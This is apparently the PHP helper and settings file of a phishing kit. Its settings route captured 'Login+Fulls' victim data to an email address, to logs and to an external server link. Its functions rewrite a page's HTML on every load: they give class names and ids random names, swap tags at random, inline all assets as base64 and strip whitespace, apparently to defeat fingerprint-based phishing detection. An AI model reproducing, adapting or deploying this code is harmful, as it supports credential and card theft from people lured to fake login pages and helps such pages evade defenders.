<?php
error_reporting(0);
$send = "Enter your email here";

$pagetype = 1; // 1: Login+Fulls   2: Fulls Only

$pageonline = 1; //   feature On (1) and off (0) toggle
$ip_logger = 0; //   feature On (1) and off (0) toggle
$email_feature = 1; // feature On (1) and off (0) toggle
$log_feature = 1; // feature On (1) and off (0) toggle
$external_log = 1; // feature On (1) and off (0) toggle

$external_link = "http://www.domain.com/a.php"; // Link for external server's savehm.php file

$assetsPaths = [
	'',
	'/assets',
];

function replaceElementAttribute(DOMDocument $dom, $class, $replace, $find = "class") {
	$finder = new DomXPath($dom);
	$nodes = $finder->query("//*[contains(concat(' ', normalize-space(@" . $find . "), ' '), ' $class ')]");

	foreach ($nodes as $key => $node) {
		$attr = $node->getAttribute($find);
		$attrReplace = preg_replace("/\b$class\b/", $replace, $attr);

		$node->removeAttribute($find);
		$node->setAttribute($find, $attrReplace);
	}
}

function getStyles(DOMDocument $dom) {
	$finder = new DomXPath($dom);

	$nodesLinks = $finder->evaluate("//link[@rel='stylesheet']");
	$nodesStyles = $finder->evaluate("//style");

	$hrefs = '';

	foreach ($nodesLinks as $key => $value) {

		$href = $value->getAttribute("href");

		foreach ($GLOBALS['assetsPaths'] as $index => $path) {

			$content = file_get_contents(__DIR__ . $path . '/' . $href);
			if ($content) {
				$hrefs .= $content . ' ';
				break;
			}

		}

		$value->parentNode->removeChild($value);
	}

	foreach ($nodesStyles as $key => $value) {
		$hrefs .= $value->textContent . ' ';
		$value->parentNode->removeChild($value);
	}

	$node = $dom->createElement("style");
	$node->textContent = '##STYLE##';

	$newnode = $dom->getElementsByTagName('head')[0]->appendChild($node);

	$elementsArray = ["article", "section", "aside"];

	preg_match_all('/[^},\n\t]*\bdiv\b[^{,\n\t]*/', $hrefs, $matches);

	$matches = array_unique(array_filter($matches[0]));

	foreach ($matches as $key => $value) {

		if (strpos($value, '/*') !== false) {
			continue;
		}

		$newString = $value;
		foreach ($elementsArray as $index => $tagName) {
			$newString .= ', ' . preg_replace("/\bdiv\b/", $tagName, $value);
		}

		$hrefs = preg_replace("/$value/", $newString, $hrefs);

	}

	return $hrefs;

}

function getScripts(DOMDocument $dom) {
	$finder = new DomXPath($dom);

	$nodesScript = $finder->evaluate("//script");

	$hrefs = '';

	foreach ($nodesScript as $key => $value) {
		$href = $value->getAttribute("src");

		$hrefs .= ($value->textContent) . ' ';
		if ($href) {
			foreach ($GLOBALS['assetsPaths'] as $index => $path) {

				$content = file_get_contents(__DIR__ . $path . '/' . $href);
				if ($content) {
					$hrefs .= ($content) . ' ';
					break;
				}

			}
		}
		$value->parentNode->removeChild($value);

	}

	$node = $dom->createElement("script");
	$node->textContent = '##SCRIPT##';

	$newnode = $dom->getElementsByTagName('body')[0]->appendChild($node);

	return $hrefs;

}

function sort123($a, $b) {
	return strlen($b) - strlen($a);
}

function replaceDomElementTag(DOMDocument $dom, DOMElement $node, $tagName) {
	$newElement = $dom->createElement($tagName);
	if ($node->hasAttributes()) {
		foreach ($node->attributes as $attr) {

			$name = $attr->nodeName;
			$value = $attr->nodeValue;

			$newElement->setAttribute($name, $value);
		}
	}
	while ($node->childNodes->length) {
		$newElement->appendChild($node->childNodes[0]);
	}

	$node->parentNode->replaceChild($newElement, $node);
}

function closeTags($string) {

	$elementsArray = ["article", "section", "aside", "div"];
	$fragment = $string;
	$doc = new DOMDocument();
	$doc->loadHTML($fragment);
	$correctFragment = $doc->getElementsByTagName('div');

	for ($i = count($correctFragment) - 1; $i >= 0; $i--) {
		$elementNode = $correctFragment[$i];

		$el = array_rand($elementsArray, 1);

		$element = $elementsArray[$el];

		replaceDomElementTag($doc, $elementNode, $element);

	}

	if (count($correctFragment) > 1) {

		return closetags($doc->saveHtml());
	}

	return $doc->saveHtml();

}

function replaceTags($html) {
	$doc = new DOMDocument();
	$html = closeTags($html);

	$doc->loadHTML($html);

	$allElements = $doc->getElementsByTagName('*');

	$classes = [];
	$names = [];

	foreach ($allElements as $key => $value) {
		$nodeClasses = explode(' ', $value->getAttribute("class"));
		$nodeIds = $value->getAttribute("id");
		$nodeNames = $value->getAttribute("name");

		$nodeClasses = array_map(function ($class) {
			if ($class) {

				return $class;
			}
			return '';
		}, $nodeClasses);

		if ($nodeIds) {
			array_push($classes, $nodeIds);
		}

		$classes = array_merge($classes, $nodeClasses);
		array_push($names, $nodeNames);
	}
	$classes = array_unique(array_filter($classes));

	$names = array_unique(array_filter($names));

	$classes = array_diff($classes, $names);

	usort($classes, 'sort123');

	$style = getStyles($doc);
	$style = findImages($style);
	$script = getScripts($doc);

	$script = findImages($script);

	$replaceIds = [];
	$replaceClasses = [];

	foreach ($classes as $key => $className) {
		if (strlen($className) === 1) {
			continue;
		}
		$newClassName = randomCha(rand(10, 50));
		$replaceClasses[$className] = $newClassName;
		replaceElementAttribute($doc, $className, $newClassName);
		replaceElementAttribute($doc, $className, $newClassName, 'id');

		$style = preg_replace("/\.\b$className\b/", '.' . $newClassName, $style);
		$style = preg_replace("/\#\b$className\b/", '#' . $newClassName, $style);
		$script = preg_replace("/\b$className\b/", $newClassName, $script);
	}

	$html = $doc->saveHtml();

	$html = str_replace('##RAND1##', randomCha(rand(20, 50)), $html);
	$html = str_replace('##RAND2##', randomCha(rand(20, 50)), $html);
	$html = str_replace('##RAND3##', randomCha(rand(20, 50)), $html);
	$html = str_replace('##STYLE##', ($style), $html);
	$html = str_replace('##SCRIPT##', ($script), $html);
	$html = findImages($html);
	$html = str_replace(array("\r", "\n", "\t"), '', $html);

	return $html;
}

function findImages($html) {
	preg_match_all('/(((url\()|(href=\")|(url\(\")|(url\(\')|(src=\"))[a-zA-Z\/\-\_0-9\.]*\.(([jJ][pP][gG])|([pP][nN][gG])|([iI][cC][oO])|([sS][vV][gG])|([gG][iI][fF])|([wW][oO][fF][fF][2])|([wW][oO][fF][fF])))/', $html, $match);

	$map = [];

	foreach ($match as $key => $value) {
		$map = array_merge($map, $value);
	}

	$final = [];

	foreach ($map as $key => $value) {
		$newVal = str_replace('url("', '', $value);
		$newVal = str_replace('url(\'', '', $newVal);
		$newVal = str_replace('url(', '', $newVal);
		$newVal = str_replace('src="', '', $newVal);
		$newVal = str_replace('href="', '', $newVal);

		if (strlen($newVal) === 0 || in_array($newVal, ['gif', 'png', 'jpg', 'svg', 'ico', 'woff2', 'woff', "favicon.ico"])) {
			continue;
		}

		$arrayClasses = explode(' ', $newVal);

		$final = array_merge($final, $arrayClasses);

	}

	$final = array_unique($final);
	sort($final);

	foreach ($final as $key => $value) {

		$path = "";
		$type = "";
		$data = "";
		$ok = 0;
		foreach ($GLOBALS['assetsPaths'] as $index => $filePath) {
			$path = __DIR__ . $filePath . '/' . $value;
			if (file_exists($path)) {
				$type = mime_content_type($path);
				$data = file_get_contents($path);
				$ok = 1;
				break;
			}
		}

		if (!$ok) {
			continue;
		}

		$base64 = 'data:' . $type . ';base64,' . base64_encode($data);
		if ($type === 'image/svg') {
			$base64 = 'data:' . $type . '+xml;base64,' . base64_encode($data);

		}

		$html = preg_replace("|" . preg_quote($value, "|") . "|", $base64, $html);
	}

	return $html;
}

function randomCha($len) {
	$str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$out = "";
	for ($i = 0; $i <= $len; $i++) {
		$out .= $str[rand(0, 51)];
	}
	return $out;
}

?>